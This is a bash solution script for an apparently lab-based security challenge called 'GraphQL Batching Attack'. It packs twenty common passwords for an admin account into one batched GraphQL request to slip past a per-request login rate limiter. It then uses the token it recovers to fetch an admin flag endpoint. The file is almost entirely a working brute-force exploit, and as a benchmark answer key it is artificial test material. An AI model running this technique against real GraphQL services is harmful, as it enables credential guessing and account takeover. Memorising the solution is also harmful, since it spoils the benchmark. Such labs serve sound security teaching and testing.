#!/usr/bin/env bash
# APEX-013-25 — "GraphQL Batching Attack" (tags: graphql, brute_force)
#
# The login is rate limited to five attempts a minute. The limiter counts HTTP
# requests, and GraphQL lets one HTTP request carry an array of operations, so
# a whole wordlist arrives as one request and costs one unit of the budget.
#
# The wordlist goes in as a JSON array body, which `--set json.…` cannot
# describe — the top level of the body is not an object with fields. `body.raw`
# is the target for that: it replaces the whole body, and the request keeps its
# method, its path and its `Content-Type`.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex013-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

BATCH="$(python3 -c '
import json
words = ["password", "123456", "admin", "admin123", "password123", "letmein",
         "welcome", "monkey", "dragon", "master", "qwerty", "login",
         "admin@123", "root", "toor", "pass123", "test", "guest",
         "changeme", "secret"]
print(json.dumps([
    {"query": "mutation { login(email: \"admin@example.com\", password: \"%s\")"
              " { success token } }" % word}
    for word in words
]))
')"

"$H5I" browser open "$URL/graphql" --session "$SESSION" --new --capture >/dev/null

TOKEN="$(send "$SESSION" req_0 --create \
    --set method=POST \
    --set header.Content-Type=application/json \
    --set "body.raw=$BATCH" | body | python3 -c '
import json, sys
for reply in json.load(sys.stdin):
    out = (reply.get("data") or {}).get("login") or {}
    if out.get("token"):
        print(out["token"])
        break
')"

send "$SESSION" req_0 --create \
    --set path=/api/admin/flag \
    --set "header.Authorization=Bearer $TOKEN" | flag
